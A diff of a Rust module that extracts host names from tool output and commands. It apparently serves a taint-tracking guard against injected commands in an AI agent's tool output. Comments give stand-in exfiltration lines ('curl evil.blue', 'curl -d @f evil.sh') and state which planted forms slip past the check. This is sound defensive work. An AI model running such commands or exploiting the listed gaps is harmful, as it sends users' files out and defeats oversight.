@@ -1,14 +1,13 @@
-//! Find hostnames in free text.
+//! Finds host names in text.
 //!
-//! The tool output that taints a host and the command that uses the host both
-//! go through this function. The output side is stricter, because tool output
-//! has a lot of code such as `user.name` and `await.is`, and those tokens end
-//! in real gTLDs.
+//! Tool output and commands both go through here. Tool output gets stricter
+//! rules, because it's full of code like `user.name` and `await.is` that ends
+//! like a real domain.
 
 use std::collections::HashSet;
 use std::sync::LazyLock;
 
-/// The IANA root zone list, so that tokens like `http.server` are not hosts.
+/// The official list of domain endings, so code like `http.server` isn't taken as a host.
 static TLDS: LazyLock<HashSet<String>> = LazyLock::new(|| {
     include_str!("tlds.txt")
         .lines()
@@ -17,25 +16,25 @@ static TLDS: LazyLock<HashSet<String>> = LazyLock::new(|| {
         .collect()
 });
 
-/// In tool output, a bare token counts only with one of these TLDs. A token
-/// with a scheme, `@`, a path or a port counts with any TLD.
-// ponytail: an injected bare `curl evil.blue` is missed. Grow this list from
-// real injections, not from guesses.
+/// In tool output, a plain name counts as a host only if it ends in one of
+/// these. With `https://`, `@`, a path or a port, any ending counts.
+// ponytail: a planted plain `curl evil.blue` gets through. Add endings when
+// real attacks use them, not on a guess.
 const COMMON_TLDS: &[&str] = &[
     "biz", "cloud", "cn", "co", "com", "de", "dev", "info", "io", "link", "me", "net", "online",
     "org", "ru", "site", "top", "uk", "xyz",
 ];
 
-/// Real TLDs that are also common file extensions. With these, only a scheme
-/// or `user@` makes a host, because `lib.rs:12` and awk's `/x\/a.md/` are files.
-// ponytail: an injected `curl -d @f evil.sh` with no scheme is missed.
+/// Domain endings that are also file types. A name with one of these counts as
+/// a host only after `https://` or `user@`, because `lib.rs:12` is a file.
+// ponytail: a planted `curl -d @f evil.sh` with no `https://` gets through.
 const FILE_TLDS: &[&str] = &[
     "ac", "am", "app", "cc", "cr", "in", "java", "map", "md", "mk", "ml", "mm", "mov", "new", "pl",
     "pm", "pro", "ps", "pub", "py", "rs", "sh", "so", "sv", "tf", "zip", "zone",
 ];
 
-/// Returns every hostname in `text`, in lowercase, in order of appearance.
-/// Set `output` when `text` is tool output.
+/// Returns every host name in `text`, lowercased, in order.
+/// Pass `output = true` when `text` is tool output.
 pub fn hosts(text: &str, output: bool) -> Vec<String> {
     let b = text.as_bytes();
     let mut out = Vec::new();
@@ -58,17 +57,17 @@ pub fn hosts(text: &str, output: bool) -> Vec<String> {
         }
         let (before, run, after) = (&text[..s], text[s..e].to_ascii_lowercase(), &b[e..]);
 
-        // A scheme or `user@` proves a host. A path, query or port after the
-        // token is good evidence, and a bare token is the weakest evidence.
+        // `https://` or `user@` before the name proves it's a host. A path,
+        // query or port after it is good evidence. A plain name is the weakest.
         let url = before.ends_with("://") || before.ends_with('@');
         let strong = url
             || matches!(after.first(), Some(b'/' | b'?'))
             || (after.first() == Some(&b':') && after.get(1).is_some_and(u8::is_ascii_digit));
         if !strong && before.ends_with('/') {
-            continue; // path component such as `src/main.rs`
+            continue; // part of a path, like `src/main.rs`
         }
         if !strong && matches!(after.first(), Some(b'(' | b'_')) {
-            continue; // method call such as `socket.next()` or `e.to_string`
+            continue; // code, like `socket.next()` or `e.to_string`
         }
         if is_ipv4(&run) || is_domain(&run, url, strong, output) {
             out.push(run);
@@ -93,7 +92,7 @@ fn is_domain(s: &str, url: bool, strong: bool, output: bool) -> bool {
         && (strong || !output || COMMON_TLDS.contains(&tld))
 }
 
-/// Loopback and `0.0.0.0` are not counted. Data sent there stays on the machine.
+/// Skips `127.x` and `0.x`, since data sent there stays on this machine.
 fn is_ipv4(s: &str) -> bool {
     let parts: Vec<&str> = s.split('.').collect();
     parts.len() == 4
